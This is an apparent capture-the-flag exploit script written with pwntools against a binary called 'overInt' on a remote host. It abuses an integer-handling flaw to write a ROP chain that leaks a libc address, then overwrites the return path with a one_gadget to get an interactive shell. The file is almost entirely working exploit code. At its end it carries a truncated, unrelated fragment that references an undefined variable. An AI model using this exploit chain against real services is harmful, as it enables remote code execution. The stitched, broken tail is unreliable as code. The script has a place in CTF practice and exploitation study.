#!/usr/bin/env python
from pwn import *
context.log_level='debug'
e=ELF('./overInt')
puts_plt=e.plt['puts']
puts_got=e.got['puts']
pop_rdi_ret=0x0000000000400b13

def edit(num,payload):
    for i in range(num):
        p.recvuntil('Which position you want to modify?\n')
        p.send(p32(0x38+i))
        p.recvuntil('What content you want to write in?\n')
        p.send(payload[i])

#p=process('./overInt')
p=remote('58.20.46.150',35104)
p.recvuntil('Please set arrary number: \n')
payload=p8(40)+'\x00'+'\x00'+'\x60'

p.send(payload)

p.recvuntil('How many numbers do you have?\n')

p.send('\x05\x00\x00\x00')
p.recvuntil('is: \n')
p.send(p32(0x20633372))

#gdb.attach(p,'b *0x4007D0')
for i in range(4):
    p.recvuntil('is: \n')
    p.send(p32(0))
#gdb.attach(p,'b *0x400AAC')
p.recvuntil('How many positions you want to modify?\n')
p.send(p32(32))

rop_payload1=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(e.entry)
edit(32,rop_payload1)

p.recvuntil('hello!')
puts_libc=u64(p.recvline()[0:6].ljust(8,'\x00'))


print(hex(puts_libc))
'''
from LibcSearcher import *
obj=LibcSearcher('puts',puts_libc)
puts_off=obj.dump('puts')
system_off=obj.dump('system')
print(hex(puts_off))
print(hex(system_off))
'''

puts_off=0x6f690
system_off=0x45390
libc_base=puts_libc-puts_off

one_off=0x45216
one_off=0x4526a
one_off=0xf02a4
one_off=0xf1147
one_gadget=libc_base+one_off

# =================================

p.recvuntil('Please set arrary number: \n')
payload=p8(40)+'\x00'+'\x00'+'\x60'

p.send(payload)

p.recvuntil('How many numbers do you have?\n')

p.send('\x05\x00\x00\x00')
p.recvuntil('is: \n')
p.send(p32(0x20633372))

#gdb.attach(p,'b *0x4007D0')
for i in range(4):
    p.recvuntil('is: \n')
    p.send(p32(0))
#gdb.attach(p,'b *0x400AAC')
p.recvuntil('How many positions you want to modify?\n')
p.send(p32(8))

rop_payload2=p64(one_gadget)
edit(8,rop_payload2)

p.interactive()





#!/usr/bin/env python

def new(index):
    p.sendline('1')
    p.sendline(str(index))
    p.sendline(size)